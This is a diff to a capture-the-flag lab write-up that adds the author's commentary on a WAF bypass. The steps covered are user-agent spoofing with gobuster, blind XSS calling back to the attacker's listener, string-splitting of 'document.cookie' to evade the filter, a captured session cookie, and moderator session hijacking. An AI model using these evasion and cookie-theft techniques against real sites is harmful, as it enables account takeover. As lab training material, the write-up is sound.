@@ -82,6 +82,8 @@ Web Application Firewall is ACTIVE
 ---
 
 ### 3. WAF Bypass (User-Agent Spoofing)
+The firewall blocked `gobuster dir -u http://10.67.171.240/ -w /usr/share/wordlists/dirb/common.txt` because of the user-agent. so we need a legityimate looking user-agent like mozilla 5.0 
+
 ```bash
 gobuster dir -u http://10.67.171.240/-w /usr/share/wordlists/dirb/common.txt-a Mozilla/5.0
 ```
@@ -96,9 +98,14 @@ gobuster dir -u http://10.67.171.240/-w /usr/share/wordlists/dirb/common.txt-a M
 | /php.ini       | 403    | Blocked       |
 | /server-status | 403    | Blocked       |
 
+/config is blocked by the firewall but /logs is not. 
+
+**explanation why this works with mozilla/5.0?**
+
 ---
 
 ### 4. Log File Analysis
+I went to /logs and found error.log and there was some interesting information.
 ```lua
 /logs/error.log
 ```
@@ -109,6 +116,8 @@ gobuster dir -u http://10.67.171.240/-w /usr/share/wordlists/dirb/common.txt-a M
 ---
 
 ### 5. Blind XSS Discovery
+We now know that we can maybe use a xss payload against the website to get a moderator cookie. first we start with a simple payload and see if we get a response on my own machine.
+
 ```html
 <img src="http://10.67.101.111:8000" />
 ```
@@ -119,10 +128,12 @@ python3 -m http.server 8000
 ```sql
 GET / HTTP/1.1
 ```
+It worked we got a response and we know there is a blind xss possible. now lets get the cookie so we can login as a moderator to retrieve the first flag.
 
 ---
 
 ### 6. WAF Evasion – Cookie Exfiltration
+First i tried script to test of the firewall will block that, but it didn't so thats good. and the i tried document.cookie but that didn't work. so now iknow the firewall will block it. but document["coo"+"kie"] werkte wel. 
 
 **Blocked:**
 ```html
@@ -139,10 +150,14 @@ python3 -m http.server 9001
 ```ini
 PHPSESSID=e1omj7ther5rnh0g5ks70vjn84
 ```
+explanation why it works and how it works?
 
 ---
 
 ### 7. Moderator Access
+I changed the retrieved cookie with my cookie and refreshed the page. I was now logged in as the moderator.
+
+**What is the flag value after logging in as a moderator?**
 ```text
 THM{REDACTED}
 ```
